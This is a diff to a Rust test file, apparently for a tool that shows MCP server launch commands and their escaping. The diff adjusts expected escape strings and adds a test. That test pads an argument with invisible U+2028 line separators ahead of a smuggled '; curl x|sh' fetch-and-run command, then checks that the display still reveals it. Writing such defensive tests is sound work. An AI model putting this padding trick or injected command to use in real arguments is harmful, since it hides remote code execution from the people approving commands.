@@ -19,7 +19,7 @@ fn local(server: &str, program: &[&str], names: &[&str]) -> McpLaunchAsk {
 #[test]
 fn quoting_and_escaping_are_counted_as_shown() {
     let shown = program(&["tool".to_owned(), GROWS.to_owned()]);
-    assert_eq!(shown, "tool \"it's \\\\ \\\\n\\\\u{202e}é𝔄\"");
+    assert_eq!(shown, "tool \"it's \\\\ \\n\\u{202e}é𝔄\"");
     let ask = local("s", &["tool", GROWS], &["A\tB"]);
     let raw = 4 + GROWS.chars().count() + 3;
     assert_eq!(
@@ -49,7 +49,7 @@ fn an_imports_count_is_its_list_and_names_line_as_shown() {
     ];
     let list = import_list(&asks);
     let names = import_names(&asks);
-    assert_eq!(list, "a (tool \"it's \\\\ \\\\n\\\\u{202e}é𝔄\"), b (npx)");
+    assert_eq!(list, "a (tool \"it's \\\\ \\n\\u{202e}é𝔄\"), b (npx)");
     assert_eq!(names, "TOKEN (a)");
     assert_eq!(
         import_chars(&asks),
@@ -65,4 +65,16 @@ fn left_out_names_show_whole_or_not_at_all() {
     // 100 names of 4 characters and their separators pass the 500 characters.
     let many: Vec<String> = (0..100).map(|n| format!("t{n:03}")).collect();
     assert_eq!(left_out(&many), None);
+}
+
+/// U+2028 padding can't push the end of an argument out of view: each one is six characters on
+/// one line, and a padded ask is counted at six a separator.
+#[test]
+fn line_separator_padding_is_counted_and_drawn_on_one_line() {
+    let arg = format!("a{}; curl x|sh", "\u{2028}".repeat(1990));
+    let shown = program(&["npx".to_owned(), arg]);
+    assert!(!shown.contains('\u{2028}') && !shown.contains('\n'));
+    assert!(shown.ends_with("; curl x|sh'"), "{shown}");
+    let ask = local("s", &["npx", &format!("a{}", "\u{2028}".repeat(1990))], &[]);
+    assert!(ask_chars(&ask) > 1990 * 8);
 }
